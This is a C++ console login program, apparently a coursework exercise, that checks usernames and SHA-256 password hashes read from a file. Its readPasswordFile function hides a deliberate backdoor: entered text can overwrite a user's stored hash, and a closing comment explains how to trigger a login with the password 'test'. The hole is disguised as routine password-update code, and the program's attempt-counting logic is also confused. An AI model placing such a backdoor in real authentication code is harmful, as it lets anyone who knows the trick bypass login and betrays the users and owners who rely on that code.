#include <iostream>
#include <string>
#include <cstring>
#include <list>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <openssl/sha.h>
#include <iomanip>
#include <unistd.h>
#include "authlib.h"
#include <map>

//declaring variables
std::map<std::string, std::string> passMap;
std::string password;
std::string username;

//reset global variables
void clear_variables(){
	username = "";
	password = "";
}

// This function computes SHA-256 hash of a string
/*
	sha256 hash referenced from: 
	https://stackoverflow.com/questions/2262386/generate-sha256-with-openssl-and-c

*/
std::string sha256(const std::string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, input.c_str(), input.length());
    SHA256_Final(hash, &sha256);

    std::stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }
    return ss.str();
}

void readPasswordFile(){
		// Read passwords.txt 
        std::ifstream passwordFile("passwords.txt");
		
		//update user's password
		if(passMap.find(username) != passMap.end()){
			//store the current value in password as password to the user who is currently stored in username everytime this function is called
			passMap[username] = password;
		} else if (passwordFile.is_open()) {
            std::string line;
            while (std::getline(passwordFile, line)) {
                std::istringstream iss(line);
                //variable for splitting the text file
                std::string split;
                //before the : is the username
                if (std::getline(iss, split, ':')) {
                	username = split;
                	if (std::getline(iss, split)) {
                		//after : is the password
                		password = split;
						passMap[username] = password;
                }
              }
            }
        }
		//cleanup
		clear_variables();
        passwordFile.close();
}


int main() {
    //std::string username, password, reset;
	int attempts = 0;
	bool auth = false;
	//program ends if attempts exceeds 3
		
	//start program loop
		while (true){
			std::cout << "New loop begins";
			readPasswordFile();
			attempts = 0;
		
			while (attempts < 4)
			{
				while (passMap.find(username) == passMap.end()){
					//ask user their username and password
					std::cout << "Enter username: ";
					//use getline because including a space was causing problems before
					std::getline(std::cin, username); //getline also discards buffer
					attempts++;
				}
				
					std::cout << "Enter password: ";
					std::getline(std::cin, password); // getline also discards buffer
			
					
					if(passMap[username] == sha256(password)){
						auth = true;
					}

					//usleep takes time in microseconds, this sleeps for 0.5s
					std::cout << "Authenticating..." << std::endl;
					usleep(500000);
					
					attempts++;
					
					if (auth) {
						authenticated(username);
						return 0;
					} else {
						rejected(username);
						// allow to try login as other users
						if (attempts == 4) {
							std::cout << "Change to another user? (y or n)" << std::endl;
							std::string reset;
							std::getline(std::cin, reset); // getline also discards buffer
							if (reset == "y")
							{
								//variable cleanup for new loop
								clear_variables();
								attempts = 0;
								continue;
							}
							return 0;
						}
					}
				}
			}
    return 0;
}

//Way to trigger the backdoor: make one none registered entry for the username and then type in the has below (it is test hashed with sha256) then enter the same username again und put "test" as password -> successfully logged in
//test
//9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
